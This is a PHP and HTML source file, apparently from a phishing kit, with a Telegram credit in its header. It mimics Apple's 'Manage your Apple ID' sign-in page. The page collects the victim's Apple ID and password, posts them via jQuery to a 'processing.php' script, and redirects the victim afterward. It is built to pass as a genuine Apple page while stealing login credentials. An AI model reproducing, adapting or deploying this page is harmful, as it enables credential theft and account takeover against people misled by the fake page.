<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "login";
    $semantic = semantic();
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../../media/imgs/ff.ico" />

        <title>Manage your Apple ID</title>
    </head>

    <body>

        <div class="wrapper">
        <div class="all">
            <div class="a-nvbr">

                <div class="nav-con">
                    <ul>
                        <li>
                            <a href="#" class="__link __logo__"></a>
                        </li>
                        <li>
                            <a href="" class="__link"><?php echo get_text('menu1'); ?></a>
                        </li>
                        <li><a href="" class="__link"><?php echo get_text('menu2'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu3'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu4'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu5'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu6'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu7'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu8'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu9'); ?></a></li>
                        <li><a href="" class="__link"><?php echo get_text('menu10'); ?></a></li>
                        <li>
                            <a href="#" class="__link search"></a>
                        </li>
                        <li>
                            <a href="#" class="__link shp-ico"></a>
                        </li>
                    </ul>

                    <div class="hum">
                        <img src="../media/imgs/hamburger.png" alt="">
                    </div>

                    <div class="logo__container"><img src="../media/imgs/apple.svg" alt=""></div>

                    <div class="shop">
                        <img src="../media/imgs/shop.svg" alt="">
                    </div>

                </div>

            </div>
            <div class="con-cus">
                <div class="head">
                    <div class="hd-wrp">
                        <a href="#" class="_apple_link"><?php echo get_text('apple_id'); ?></a>
                        <ul class="applehd-items">
                            <li class="apple-h-it">
                                <span class="hdap-link current-link"><?php echo get_text('smenu1'); ?></span>
                            </li>
                            <li class="apple-h-it">
                                <a class="hdap-link"><?php echo get_text('smenu2'); ?></a>
                            </li>
                            <li class="apple-h-it">
                                <a class="hdap-link"><?php echo get_text('smenu3'); ?></a>
                            </li>
                        </ul>

                        <div class="arrow-down">
                            <img src="../media/imgs/arrow-down.png" alt="">
                        </div>
                    </div>
                </div>
                <div class="content-wrap">
                    <input type="hidden" id="cap" name="cap">
            <input type="hidden" name="steeep" id="steeep" value="login">
                    <div class="auth-cnt">
                        <img class="__logo__img" src="../media/imgs/apple-login.png" alt="">
                        <h1><?php echo get_text('apple_id'); ?></h1>
                        <p>
                            <?php echo get_text('manage'); ?>
                        </p>
                        <div class="float-grp">
                            <label for="id" class="lbl-grp"><?php echo get_text('apple_id'); ?></label>
                            <input name="id" id="id" type="text" class="apl-inpt input-id">
                            <?php if( !isset($_GET['error']) ) : ?>
                            <button class="sign-in-btn-1">
                                <img src="../media/imgs/arrow.png" alt="">
                            </button>
                            <?php endif; ?>
                        </div>
                        <div class="float-grp password-groupe <?php if( !isset($_GET['error']) ) { echo "hidden"; } ?>">
                            <label for="password" class="lbl-grp"><?php echo get_text('password'); ?></label>
                            <input name="password" id="password" type="password" class="apl-inpt input-password">
                            <button id="booom" class="sign-in-btn-1">
                                <img src="../media/imgs/arrow.png">
                            </button>
                        </div>

                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <p>
                                <?php echo get_text('error_login'); ?>
                            </p>
                        </div>
                        <?php endif; ?>

                        <div class="remember-me">
                            <div class="rmb-cld">
                                <input name="remember" value="" id="remember" type="checkbox">
                                <label for="remember"><?php echo get_text('remember'); ?></label>
                            </div>
                        </div>
                        <div class="f-linked">
                            <a href="#" class="forgot-link"><?php echo get_text('forget'); ?></a>
                            <img src="../media/imgs/arrow-up.png" alt="">
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="fot-cntr">
                <p>
                    <?php echo get_text('footer_text'); ?>
                </p>
                <div class="d-flex align-items-center copyright">
                    <div class="d-flex align-items-center sub-copy">
                        <p>
                            <?php echo get_text('copyright'); ?>
                        </p>
                        <ul>
                            <li>
                                <?php echo get_text('footer1'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer2'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer3'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer4'); ?>
                            </li>
                            <li>
                                <?php echo get_text('footer5'); ?>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>
        </div>
    </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'id' : $('#id').val(),
                    'password' : $('#password').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>